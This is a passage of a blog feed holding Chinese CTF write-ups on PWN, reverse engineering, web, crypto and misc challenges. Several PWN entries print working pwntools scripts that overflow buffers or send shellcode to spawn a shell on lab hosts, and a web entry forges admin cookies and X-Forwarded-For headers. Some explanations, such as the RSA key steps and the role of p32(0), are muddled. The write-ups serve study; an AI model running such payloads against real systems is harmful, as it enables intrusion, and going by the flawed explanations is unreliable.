      <categories>
          
          <category> Crypto </category>
          
          <category> Rabbit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shellcode</title>
      <link href="/2025/06/63e0052f564e.html"/>
      <url>/2025/06/63e0052f564e.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/D963E729-82E8-4920-BCC6-3E43CDB31255.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/./../../images/Pastedimage20250605220423.png"><br><img src="/./../../images/Pastedimage20250605220507.png"><br>也没有开啥保护。<br>logo明显提示用shellcode,所以我们需要发送sellcode。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;10.190.131.17&quot;</span>,<span class="number">62534</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../../images/17DD8EEB-247B-4BB2-8BA3-995677E381841.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/2025/06/1f04604b780a.html"/>
      <url>/2025/06/1f04604b780a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/82DBD94C-4B71-4F33-8BD4-3EECD2675F78.png"><br><img src="/./../../images/Pastedimage20250605212046.png"><br><img src="/./../../images/Pastedimage20250605212223.png"><br>这里的<strong>0 ~ 0x7fffffff</strong>就是 <strong>0~2147483647</strong> ，<br><strong>0x80000000 ~ 0xffffffff</strong>就是 <strong>-2147483648 ~ -1</strong><br><img src="/./../../images/Pastedimage20250605212238.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器（根据题目提示修改端口）</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">61862</span>)  <span class="comment"># 示例端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待提示</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter an unsigned integer: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送目标数字</span></span><br><span class="line">p.sendline(<span class="string">b&quot;4294967295&quot;</span>)  <span class="comment"># 或 b&quot;-1&quot; 在某些环境下也可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收flag</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall().decode())</span><br></pre></td></tr></table></figure><p>这道题涉及整数溢出漏洞利用，目标是通过输入特定数字触发<code>gift()</code>函数获取flag。以下是完整的解题步骤：</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li><strong>关键代码</strong>：<br> printf(“Enter an unsigned integer: “);<br> _isoc99_scanf(“%u”, &amp;v4);  &#x2F;&#x2F; 读取无符号整数<br> if (v4 &#x3D;&#x3D; -1)  &#x2F;&#x2F; -1在无符号中等于4294967295<br> gift();    &#x2F;&#x2F; 触发flag输出</li><li><strong>整数溢出原理</strong>：<ul><li><code>v4</code>是<code>unsigned int</code>类型（4字节）</li><li><code>-1</code>在内存中被解释为无符号整数的最大值：<code>0xFFFFFFFF</code>（4294967295）    </li><li>输入<code>4294967295</code>可使条件<code>v4 == -1</code>成立</li></ul></li><li><strong>防护机制</strong>：<br> Full RELRO | Canary | NX | PIE<br> 虽然防护较强，但无需绕过这些保护，因为利用不涉及栈溢出</li></ol><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol><li><strong>计算目标值</strong>：<br> 4294967295 &#x3D; 2³² - 1 &#x3D; 0xFFFFFFFF</li><li><strong>触发gift函数</strong>：<ul><li>当输入<code>4294967295</code>时：<br>  v4 &#x3D; 4294967295 &#x3D; 0xFFFFFFFF<br>  v4 &#x3D;&#x3D; -1 → True  &#x2F;&#x2F; 因为-1在无符号中就是0xFFFFFFFF</li><li>执行<code>system(&quot;cat /ctfshow_flag&quot;)</code><br> <img src="/images/91C4D1E4-DA5C-45B1-A1AE-72BD35872AC2.png"></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2025/06/6eb5ab8aa336.html"/>
      <url>/2025/06/6eb5ab8aa336.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/53C70E9A-8E89-4C8B-95E3-7078BD55343B1.png"><br>32位<br><img src="/./../../images/Pastedimage20250605135457.png"><br>Tab键<br><img src="/./../../images/Pastedimage20250605135812.png"><br>nc一下<br><img src="/./../../images/EAFBEA4F-0F51-421C-AD17-A89910A6224D.png"><br>看pwnme函数<br><img src="/./../../images/Pastedimage20250605140015.png"><br>这里有个fgets函数<br>Tab键<br><img src="/./../../images/Pastedimage20250605140201.png"><br><strong>可以看到第一行s这个变量是在距离栈底ebp9个字节的地方</strong><br><img src="/./../../images/463C8EE2-1263-43AF-B876-7B0C4F4B928F.png"><br>题目叫stack，所以看了一下stack函数<br><img src="/./../../images/Pastedimage20250605140449.png"><br>妥妥的getshell函数<br>这段代码 system(“&#x2F;bin&#x2F;sh”) 的作用是在 Linux 系统中执行 &#x2F;bin&#x2F;sh 命令，它会打开一个新的 shell 进程。<br>具体来说，&#x2F;bin&#x2F;sh 是指向系统中的默认 shell 解释器的路径。通过执行该命令，你将进入一个新的交互式 shell 环境，可以在其中执行各种命令和操作。这对于开发者或者在某些情况下需要与系统进行交互的用户来说非常有用。</p><p>main点一下绿色<br><img src="/./../../images/Pastedimage20250605141027.png"><br>可以看到该函数地址为0x0804850F<br><img src="/./../../images/3BBE1FF3-C061-4222-B03E-C2B1AB35901F.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)    <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)   <span class="comment">#用a字符填满前面9个字节的空白，然后再用4字节填满原来的ebp(这里为汇编基础，因为程序位32位程序）</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)                    <span class="comment">#然后p32将stack函数写入地址的四个字节</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../../images/3D19A85A-20C8-444E-A235-C906BCB99447.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&quot;pwn.chall.ctf.show&quot;</span>,<span class="number">28006</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF</title>
      <link href="/2025/06/232c7fc0fbd9.html"/>
      <url>/2025/06/232c7fc0fbd9.html</url>
      
        <content type="html"><![CDATA[<p>linux也能逆？</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tea</title>
      <link href="/2025/06/e1972a9f50a5.html"/>
      <url>/2025/06/e1972a9f50a5.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250606185429.png"><br><img src="/images/Pastedimage20250606185436.png"><br><img src="/images/Pastedimage20250606185452.png"></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单的加密</title>
      <link href="/2025/06/596e40547bb0.html"/>
      <url>/2025/06/596e40547bb0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604161939.png"><br>shift+F12+Fn<br><img src="/images/Pastedimage20250604162108.png"><br>点击<br><img src="/images/Pastedimage20250604162142.png"><br>点击紫色的<br><img src="/images/Pastedimage20250604162209.png"><br>Tab键<br><img src="/images/25FB6DF9-3CCD-4E0E-8CCD-6A7C5D792114.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-114h]  </span><br><span class="line">  char Str1[260]; // [esp+DCh] [ebp-108h] BYREF</span><br><span class="line">  </span><br><span class="line">  #提示用户输入 flag</span><br><span class="line">  sub_456502(&quot;Hi CTFer,Input your flag:&quot;);</span><br><span class="line">  sub_4554EF(&quot;%s&quot;, Str1);</span><br><span class="line">  </span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str1); ++i )</span><br><span class="line">    ++Str1[i]; #将每个字符的 ASCII 值加 1</span><br><span class="line">  if ( !j__strcmp(Str1, &quot;gmbh|ZPV`GJOE`JU`IBIB~&quot;) )</span><br><span class="line">    sub_456502(&quot;you are right!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_456502(&quot;you are wrong!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对目标字符串 gmbh{ZPV<code>GJOE</code>JU<code>IBIB~&#125; 进行反向操作（每个字符减 1），得到原始输入的 flag：  每个字符减 1 后：</code>flag{YOU_FIND_IT_HAHA}&#96;</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ez_http</title>
      <link href="/2025/06/5a69eaa25605.html"/>
      <url>/2025/06/5a69eaa25605.html</url>
      
        <content type="html"><![CDATA[<p>bp抓包<br><img src="/images/3AD6ED26-D5D6-4348-AF13-B5279A3A9036.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：?FantasyLand=0xLE4KCODE</span><br><span class="line">POST：lyc0ris=goat</span><br><span class="line"></span><br><span class="line">请求头：</span><br><span class="line">Referer: https://www.tzc.edu.cn/</span><br><span class="line">User-Agent: SansBrowser</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>用hackbar也行</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码演示</title>
      <link href="/2025/06/5c75ebd024e9.html"/>
      <url>/2025/06/5c75ebd024e9.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大杂烩</title>
      <link href="/2025/06/228350e34cac.html"/>
      <url>/2025/06/228350e34cac.html</url>
      
        <content type="html"><![CDATA[<p>SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9</p><p>base64<br>JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&#x3D;<br>base32<br>JFopEIrZiR5hENKthP3xENKlXNq7x<br>xxencode<br>GMPSynt{Penml_Pelcgb}<br>Rot13<br><img src="/images/ECF67C34-79AB-4AA8-A6AF-D1D146E8F829.png"><br>TZCFlag{Crazy_Crypto}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA1</title>
      <link href="/2025/06/0208f5194904.html"/>
      <url>/2025/06/0208f5194904.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p><p>&#x3D;&#x3D;dp,dq  是<code>d</code>模<code>p-1</code>和<code>q-1</code>的模逆元（在RSA中，它们通常用于快速解密，因为使用它们可以避免计算<code>d</code>，这是一个大数。&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes   #将长整数转化为字节字符串</span><br><span class="line"> </span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"> </span><br><span class="line">I = gmpy2.invert(q, p) </span><br><span class="line"> # 计算了q模p的模逆元。在数学上，这意味着I是一个整数，使得q * I mod p = 1。注意，这里的I并不是中国剩余定理中常用的h（h是p模q的模逆元），但在这个上下文中，我们只需要I</span><br><span class="line"> </span><br><span class="line">mp = pow(c, dp, p)   #使用模幂运算，计算c的dp次方模p的结果。</span><br><span class="line">mq = pow(c, dq, q)   #使用模幂运算，计算c的dq次方模q的结果。</span><br><span class="line"> </span><br><span class="line">m = (((mp-mq) * I) % p) * q + mq      #CRT的一个变种，用于从mp和mq中恢复明文m</span><br><span class="line"> </span><br><span class="line">print(long_to_bytes(m))    #解密后的整数m转换为字节字符串并输出 </span><br></pre></td></tr></table></figure><p> b’noxCTF{W31c0m3_70_Ch1n470wn}’→flag{W31c0m3_70_Ch1n470wn}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>r4</title>
      <link href="/2025/06/e37fae821c0c.html"/>
      <url>/2025/06/e37fae821c0c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/1020b887dd37.html"/>
      <url>/2025/06/1020b887dd37.html</url>
      
        <content type="html"><![CDATA[<p><strong>密钥计算方法</strong><br>1.选择两个大素数p和q(典型值为1024位)<br>2.计算<code>n=p×q</code>和<code>z=(p-1)×(q-1)</code><br>&#x2F;&#x2F; n表示欧拉函数<br>3.选择一个与z互质的数，令其为d<br>4.找到一个 e 使满足<code>exd= 1 (mod z)</code><br>5.公开密钥为<code>(e，m)</code>，私有密钥为<code>(d，m)</code><br><strong>密钥举例</strong><br>代码如下（示例）：1.假设需要加密的明文信息为m&#x3D;85，选择：e&#x3D;7，p&#x3D;11，q&#x3D;13，说明使用RSA算法的加密和解密(计算密文并还原)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=p*q=11*13=143</span><br><span class="line">z=（p-1）*（q-1）=10*12=120</span><br><span class="line"></span><br><span class="line">e*d=1(mod z)  </span><br><span class="line">7 * d( mod 120)=1  -------d=103</span><br></pre></td></tr></table></figure><p>1️⃣加密运算<br>公钥:(e,n)&#x3D;(7,143)<br>密文c&#x3D;p^e (mod n)&#x3D;123<br>2️⃣加密运算<br>密钥:(d,n)&#x3D;(103,143)<br>明文：P&#x3D;c^d (mod n)&#x3D;85</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>感觉身上重重的</title>
      <link href="/2025/06/098257f0671a.html"/>
      <url>/2025/06/098257f0671a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/out.jpg"><br><img src="/images/Pastedimage20250604103412.png"><br>TZCFlag{copy_is_useful}<br>&#x3D;&#x3D;图片下面有字隐藏其实，用stegsolve&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/3411655f66f0.html"/>
      <url>/2025/06/3411655f66f0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/354DEABD-F725-4BE5-8E53-3E409F7E10FC.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>掩码</title>
      <link href="/2025/06/bb2621d41570.html"/>
      <url>/2025/06/bb2621d41570.html</url>
      
        <content type="html"><![CDATA[<p>小强找到自己的压箱底学习资料，但是发现有密码，他隐约记得密码是长 <code>AQ***g0**0</code>，中间 <code>*</code> 号只记得是小写字母和数字，你能帮他找回密码吗<br><img src="/images/Pastedimage20250604130116.png"><br><img src="/images/Pastedimage20250604130408.png">TZCFlag{th3_password_1s_s0_so_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>暴力</title>
      <link href="/2025/06/bf9cbf41e4a4.html"/>
      <url>/2025/06/bf9cbf41e4a4.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604125245.png"><br>TZCFlag{the_passw0rd_is_sooo_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>明文</title>
      <link href="/2025/06/8a95981b2a01.html"/>
      <url>/2025/06/8a95981b2a01.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/57FCDD10-AE2B-4DBF-8DE9-1B19984A5445.png"><br>把pdf改成压缩包</p><p><img src="/images/Pastedimage20250604130730.png"><br><img src="/images/9FF4A261-2915-4D42-B8F4-FFA1CA8AB5E5.png"><br>有问题</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/4b2a6ff1da24.html"/>
      <url>/2025/06/4b2a6ff1da24.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/c540cc75b717.html"/>
      <url>/2025/06/c540cc75b717.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604133850.png"><br>错的</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 综合 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Banmabanma</title>
      <link href="/2025/06/4c2e0afe7e89.html"/>
      <url>/2025/06/4c2e0afe7e89.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 码类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hear with you eyes</title>
      <link href="/2025/06/f342c5c4709f.html"/>
      <url>/2025/06/f342c5c4709f.html</url>
      
        <content type="html"><![CDATA[<p>打开频谱图<br><img src="/images/2D31FA56-C817-4AC6-A587-C9008BA90B74.png"></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/fdd3a6b2e8b3.html"/>
      <url>/2025/06/fdd3a6b2e8b3.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf your_file.wav #从 WAV 文件中提取隐藏数据</span><br></pre></td></tr></table></figure><p><img src="/images/BEE0A87B-FE33-46DE-B36F-EB728163008C.png"><br>&#x3D;&#x3D;<strong>要转换的文件放在它的文件夹下</strong>&#x3D;&#x3D;<br><img src="/images/11E69F33-84F4-4962-A257-E294ED63D946.png"><br>TZCFlag{steghide_is_so_interesting}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>很普通的Disco</title>
      <link href="/2025/06/ff1c1e43f89c.html"/>
      <url>/2025/06/ff1c1e43f89c.html</url>
      
        <content type="html"><![CDATA[<p>放大<img src="/images/051C5CE7-A087-4021-8A67-CA44B66376DE.png"><br>110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101<br>&#x3D;&#x3D;<strong>ASCII是7位</strong>&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string = &#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span><br><span class="line"> </span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(0, len(string), 7):</span><br><span class="line">    bin_str = string[i: i + 7]</span><br><span class="line">    flag += chr(int(bin_str, 2))</span><br><span class="line"> </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag{W0W*funny}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32位</title>
      <link href="/2025/06/4857d55b1f10.html"/>
      <url>/2025/06/4857d55b1f10.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/0E02FF5F-B470-4DFF-ACBA-4AB58A61BF8E.png"><br><img src="/images/2574EBBA-F48A-4D4A-82BA-B370AF737470.png"><br><img src="/images/Pastedimage20250605202610.png"><br><img src="/images/Pastedimage20250605203003.png"><br><img src="/images/Pastedimage20250605205511.png"><br>这里 system 函数的地址：0x80483A0</p><p>这里将系统函数与参数分开了，我们需要手动构造，这是ROP？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line">b&#x27;a&#x27; * (0x12 + 4)：这部分是填充，填充的目的是使得输入的长度超过了原本的缓冲区大小，触发缓冲区溢出。</span><br><span class="line">p32(system)：这部分是 system 函数的地址，在利用缓冲区溢出漏洞时，重要的一步是覆盖返回地址，使得程序返回时跳转到 system 函数。</span><br><span class="line">p32(0)：这部分是 system 函数的第二个参数，在大多数情况下，system 函数的第二个参数应该是一个指向空值的指针，表示没有额外的参数，这里使用了0，表示一个空指针。</span><br><span class="line">p32(bin_sh)：这部分是 /bin/sh 字符串的地址，作为 system 函数的第一个参数，/bin/sh 是一个用于启动 shell 的路径，在利用缓冲区溢出漏洞时，我们可以使用这个参数来告诉 system 函数要执行的命令。</span><br></pre></td></tr></table></figure><p>首先在溢出后填入 system 函数的地址，这个地址将覆盖程序返回地址，以便控制程序流程。<br>此外我们需要考虑函数调用栈的结构：system函数的第一个参数通常是一个指向要执行的命令的字符串，如 &#x2F;bin&#x2F;sh，需要将这个字符串的地址作为参数传递给 system 函数，system 函数的第二个参数通常是一个指向空值的指针，表示没有额外的参数。在 payload 中，可以使用任意值，比如  0 ，使用 p32() 函数将地址转换为4字节的字符串，也可以用其他任意 4 字节字符，如 ‘aaaa’，最后再加上 bin&#x2F;sh 的地址，我们就能够利用缓冲区溢出漏洞成功调用 system(“&#x2F;bin&#x2F;sh”)，从而获取到所需的 shell。<br><img src="/images/24A745DD-622B-4D5D-89E0-A74989D98664.png"><br>&#x2F;bin&#x2F;sh 字符串的地址： 0x8048750</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">28118</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(<span class="number">0x80483A0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x8048750</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/E620E748-CEBD-4166-BD5C-889B55FC7B0C.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>64位</title>
      <link href="/2025/06/8764702209e4.html"/>
      <url>/2025/06/8764702209e4.html</url>
      
